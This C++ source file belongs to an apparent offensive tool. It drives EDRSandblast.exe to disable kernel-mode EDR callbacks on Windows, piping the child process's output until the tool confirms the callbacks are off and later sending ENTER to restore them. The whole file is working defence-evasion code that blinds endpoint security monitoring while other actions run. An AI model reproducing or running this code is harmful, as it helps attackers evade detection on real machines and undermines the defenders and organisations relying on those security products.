#include <windows.h>
#include <iostream>
#include <string>

#include "utils.h"

static bool disabled = false;
static bool notFound = false;
static HANDLE childStdInWrite = NULL;

bool disable_kernel_callbacks() {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    HANDLE childStdOutRead, childStdOutWrite;
    HANDLE childStdInRead, childStdInWriteLocal;

    if (!CreatePipe(&childStdOutRead, &childStdOutWrite, &sa, 0)) {
        std::cerr << "[!] Sandblast: Failed to create stdout pipe. Error: " << GetLastError() << "\n";
        return false;
    }
    SetHandleInformation(childStdOutRead, HANDLE_FLAG_INHERIT, 0);

    if (!CreatePipe(&childStdInRead, &childStdInWriteLocal, &sa, 0)) {
        std::cerr << "[!] Sandblast: Failed to create stdin pipe. Error: " << GetLastError() << "\n";
        CloseHandle(childStdOutRead);
        CloseHandle(childStdOutWrite);
        return false;
    }
    SetHandleInformation(childStdInWriteLocal, HANDLE_FLAG_INHERIT, 0);

    // Start child process
    STARTUPINFO si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = childStdOutWrite;
    si.hStdError = childStdOutWrite;
    si.hStdInput = childStdInRead;

    PROCESS_INFORMATION pi = { 0 };
    std::wstring cmd = get_base_path() + L"tools\\EDRSandblast.exe toggle_callbacks 01 --kernelmode -i";

    if (!CreateProcessW(
        nullptr,
        &cmd[0],
        nullptr, nullptr, TRUE, 0, nullptr, nullptr,
        &si, &pi))
    {
        std::cerr << "[!] Sandblast: Failed to start child process. Error: " << GetLastError() << "\n";
        CloseHandle(childStdOutRead);
        CloseHandle(childStdOutWrite);
        CloseHandle(childStdInRead);
        CloseHandle(childStdInWriteLocal);
        return false;
    }
    std::cout << "[*] Sandblast: Started '" << wstring2string(cmd) << "'\n";

    CloseHandle(childStdOutWrite);
    CloseHandle(childStdInRead);

    // Save write handle for later
    childStdInWrite = childStdInWriteLocal;

    // Read child's output until the prompt is found
    CHAR buffer[256];
    std::string output;
    DWORD bytesRead;

    while (true)
    {
        std::cout << "while...\n";
        BOOL success = ReadFile(childStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
        if (!success || bytesRead == 0) {
            std::cerr << "[!] Sandblast: Child process closed output or failed.\n";
            break;
        }
        std::cout << "read buffer\n";

        buffer[bytesRead] = 0;
        output += buffer;

		std::cout << buffer; // print output in real-time
		std::cout << "printed buffer\n";

        if (output.find("Press ENTER to enable callbacks again:") != std::string::npos) {
            std::cout << "[+] Sandblast: Kernel callbacks disabled\n";
            disabled = true;
            return true;
        }
        if (output.find("No EDR callbacks found, nothing to disable") != std::string::npos) {
            std::cerr << "[+] Sandblast: No EDR callbacks found, continuing...\n";
            notFound = true;
            return true;
		}
        std::cout << "looping...\n";

        Sleep(100); // avoid busy waiting
    }

    CloseHandle(childStdOutRead);
    CloseHandle(childStdInWrite);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return false;
}

bool enable_kernel_callbacks() {
    if (notFound) {
        std::cerr << "[+] Sandblast: No EDR callbacks were found before, nothing to enable now\n";
        return true;
	}

    if (!disabled) {
        std::cerr << "[+] Sandblast: Kernel callbacks not disabled, cannot enable now\n";
        return true;
    }

    if (!childStdInWrite) {
        std::cerr << "[!] Sandblast: Broken pipe, cannot enable callbacks\n";
        return false;
	}

    const char enter = '\n';
    DWORD written = 0;
    if (!WriteFile(childStdInWrite, &enter, 1, &written, nullptr)) {
        std::cerr << "[!] Sandblast: Failed to send ENTER. Error: " << GetLastError() << "\n";
        CloseHandle(childStdInWrite);
        return false;
    }

    CloseHandle(childStdInWrite);
    childStdInWrite = NULL;
    disabled = false;
    std::cout << "[+] Sandblast: Re-enabled kernel callbacks\n";
    return true;
}
